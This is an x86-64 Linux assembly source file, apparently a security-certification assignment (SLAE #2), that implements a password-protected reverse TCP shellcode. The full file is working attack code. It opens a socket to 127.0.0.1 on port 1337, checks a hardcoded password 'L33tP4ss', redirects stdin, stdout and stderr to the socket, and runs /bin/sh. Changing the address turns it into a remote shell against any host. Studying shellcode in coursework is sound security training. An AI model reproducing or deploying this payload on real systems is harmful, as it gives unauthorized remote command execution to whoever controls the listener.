; Author :      Demey Alexandre (PA-14186)
; Date :        02-06-2020
; 
; Description : SLAE assignment #2 - Shell reverse tcp with password
;               Connect to ip address 127.0.0.1 port 1337 and wait for a password
;
; Shellcode length : 106 bytes


; skrox@kali:~$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h |grep -E 'socket |connect |dup2|read |execve |exit '
; #define __NR_read 0
; #define __NR_dup2 33
; #define __NR_socket 41
; #define __NR_connect 42
; #define __NR_execve 59
; #define __NR_exit 60

global _start

section .text

_start:

   ; socket(AF_INET, SOCK_STREAM, 0) 
   xor edi, edi             
   mul edi                      ; rax, rdx, rdi set to 0
   inc edi              
   mov esi, edi                 ; SOCK_STREAM
   inc edi                      ; AF_INET
   mov al, 41                   ; socket
   syscall                  	; exec syscall

   ; connect(sockfd, {"127.0.0.1", 1337, AF_INET}, 16);
   push dword 0x0100007f	; 127.0.0.1
   push word 0x3905		; 1337
   push di 			; AF_INET
   mov rsi, rsp			; RSI point to the sockaddr struct
   mov edi, eax			; sockfd
   mov dl, 0x10			; addrlen
   mov al, 42			; connect syscall value 
   syscall                  	; exec syscall

   xchg eax, ebx		; save 0 value to EBX

   mov rsi, rsp			; RSI point to buffer on top of stack for read
   mov dl, 8			; number of bytes to read
   mov eax, ebx			; read syscall value
   syscall                  	; exec syscall

   xchg rdi, rsi		; copy user password address to RDI and keep sockfd in RSI
   mov rax, 0x737334507433334c  ; L33tP4ss
   scasq			; compare 8 bytes from RAX with 8 bytes from RDI
   xchg rdi, rsi		; reset RDI to sockfd value
   jnz goodbye			; if ZF set to 0, bad password, jump to clean exit

   mov esi, ebx			; RSI set to 0
   xchg eax, ebx		; RAX set to 0
   add esi, 3			; dup2 counter initialized

dup:
   ; dup2(sockfd, stdio)
   dec esi			; starting with stderr(2) to stdin(0)
				; RDI already set to sockfd
   mov al, 33			; dup2 syscall value
   syscall			; exec syscall
   jnz dup			; if RCX != 0 we need to confinue

   ; execve("/bin/sh", null, null)
   push rax			; string terminator
   mov al, 59			; execve syscall value
   mov rdi, 0x68732f2f6e69622f  ; "/bin//sh"
   push rdi			
   mov rdi, rsp			; RDI point to "/bin//sh"
        			; RSI already set to null pointer
   cdq				; RDX set to null pointer
   syscall                  	; exec syscall

goodbye:
   xchg eax, ebx
   mov al, 60			; exit syscall value
   syscall			; and exit